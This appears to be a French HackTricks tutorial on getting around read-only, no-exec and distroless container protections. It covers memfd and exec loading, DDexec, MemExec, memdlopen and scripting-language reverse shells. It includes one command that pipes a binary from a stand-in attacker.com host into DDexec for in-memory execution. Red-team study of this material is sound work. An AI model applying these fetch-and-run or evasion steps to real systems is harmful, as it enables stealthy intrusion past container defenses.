# Contourner les protections FS : lecture seule / pas d'exécution / Distroless

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Vidéos

Dans les vidéos suivantes, vous trouverez les techniques mentionnées dans cette page expliquées plus en détail :

* [**DEF CON 31 - Exploration de la manipulation de la mémoire Linux pour la furtivité et l'évasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusions furtives avec DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scénario lecture seule / pas d'exécution

Il est de plus en plus courant de trouver des machines Linux montées avec une **protection du système de fichiers en lecture seule (ro)**, notamment dans les conteneurs. Cela est dû au fait qu'il est facile d'exécuter un conteneur avec un système de fichiers en ro en définissant simplement **`readOnlyRootFilesystem: true`** dans le `securitycontext` :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en ro, **`/dev/shm`** restera inscriptible, donc en réalité nous pouvons écrire sur le disque. Cependant, ce dossier sera **monté avec une protection no-exec**, donc si vous téléchargez un binaire ici, vous **ne pourrez pas l'exécuter**.

{% hint style="warning" %}
D'un point de vue d'équipe rouge, cela rend **compliqué le téléchargement et l'exécution** de binaires qui ne sont pas déjà présents dans le système (comme des portes dérobées ou des outils d'énumération comme `kubectl`).
{% endhint %}

## Contournement le plus simple : Scripts

Notez que j'ai mentionné les binaires, vous pouvez **exécuter n'importe quel script** tant que l'interpréteur est présent dans la machine, comme un **script shell** si `sh` est présent ou un **script python** si `python` est installé.

Cependant, cela ne suffit pas pour exécuter votre porte dérobée binaire ou d'autres outils binaires dont vous pourriez avoir besoin d'exécuter.

## Contournements de la mémoire

Si vous souhaitez exécuter un binaire mais que le système de fichiers ne le permet pas, la meilleure façon de le faire est en l'exécutant depuis la mémoire, car les **protections ne s'appliquent pas là**.

### Contournement de l'appel système FD + exec

Si vous disposez de moteurs de script puissants dans la machine, tels que **Python**, **Perl** ou **Ruby**, vous pourriez télécharger le binaire à exécuter depuis la mémoire, le stocker dans un descripteur de fichier en mémoire (`create_memfd` syscall), qui ne sera pas protégé par ces protections, puis appeler un **appel système `exec`** en indiquant le **fd comme fichier à exécuter**.

Pour cela, vous pouvez facilement utiliser le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui passer un binaire et il générera un script dans le langage indiqué avec le **binaire compressé et encodé en b64** avec les instructions pour **le décoder et le décompresser** dans un **fd** créé en appelant la syscall `create_memfd` et un appel à l'appel système **exec** pour l'exécuter.

{% hint style="warning" %}
Cela ne fonctionne pas dans d'autres langages de script comme PHP ou Node car ils n'ont pas de **moyen par défaut d'appeler des appels système bruts** à partir d'un script, il n'est donc pas possible d'appeler `create_memfd` pour créer le **fd en mémoire** pour stocker le binaire.

De plus, la création d'un **fd régulier** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne serez pas autorisé à l'exécuter en raison de la **protection no-exec** qui s'appliquera.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui vous permet de **modifier la mémoire de votre propre processus** en écrivant dans son **`/proc/self/mem`**.

Par conséquent, en **contrôlant le code assembleur** qui est exécuté par le processus, vous pouvez écrire un **shellcode** et "muter" le processus pour **exécuter n'importe quel code arbitraire**.

{% hint style="success" %}
**DDexec / EverythingExec** vous permettra de charger et d'**exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis la **mémoire**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique, consultez le Github ou :

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) est la prochaine étape naturelle de DDexec. C'est un **shellcode demonisé DDexec**, donc chaque fois que vous voulez **exécuter un binaire différent**, vous n'avez pas besoin de relancer DDexec, vous pouvez simplement exécuter le shellcode memexec via la technique DDexec et ensuite **communiquer avec ce démon pour transmettre de nouveaux binaires à charger et exécuter**.

Vous pouvez trouver un exemple de l'utilisation de **memexec pour exécuter des binaires à partir d'un shell PHP inversé** dans [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Avec un objectif similaire à DDexec, la technique [**memdlopen**](https://github.com/arget13/memdlopen) permet un **moyen plus facile de charger des binaires** en mémoire pour les exécuter ultérieurement. Cela pourrait même permettre de charger des binaires avec des dépendances.

## Contournement de Distroless

### Qu'est-ce que Distroless

Les conteneurs Distroless contiennent uniquement les **composants strictement nécessaires pour exécuter une application ou un service spécifique**, tels que des bibliothèques et des dépendances d'exécution, mais excluent des composants plus importants comme un gestionnaire de paquets, un shell ou des utilitaires système.

L'objectif des conteneurs Distroless est de **réduire la surface d'attaque des conteneurs en éliminant les composants inutiles** et en minimisant le nombre de vulnérabilités exploitables.

### Shell Inversé

Dans un conteneur Distroless, vous pourriez **ne pas trouver même `sh` ou `bash`** pour obtenir un shell classique. Vous ne trouverez pas non plus des binaires tels que `ls`, `whoami`, `id`... tout ce que vous exécutez habituellement dans un système.

{% hint style="warning" %}
Par conséquent, vous **ne pourrez pas** obtenir un **shell inversé** ou **énumérer** le système comme vous le faites habituellement.
{% endhint %}

Cependant, si le conteneur compromis exécute par exemple une application web Flask, alors Python est installé, et donc vous pouvez obtenir un **shell Python inversé**. S'il exécute Node, vous pouvez obtenir un shell Node, et de même avec la plupart des **langages de script**.

{% hint style="success" %}
En utilisant le langage de script, vous pourriez **énumérer le système** en utilisant les capacités du langage.
{% endhint %}

S'il n'y a **pas de protections `lecture seule/sans exécution`**, vous pourriez abuser de votre shell inversé pour **écrire dans le système de fichiers vos binaires** et les **exécuter**.

{% hint style="success" %}
Cependant, dans ce type de conteneurs, ces protections existent généralement, mais vous pourriez utiliser les **techniques d'exécution en mémoire précédentes pour les contourner**.
{% endhint %}

Vous pouvez trouver des **exemples** sur la façon d'**exploiter certaines vulnérabilités RCE** pour obtenir des **shells inversés de langages de script** et exécuter des binaires en mémoire dans [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
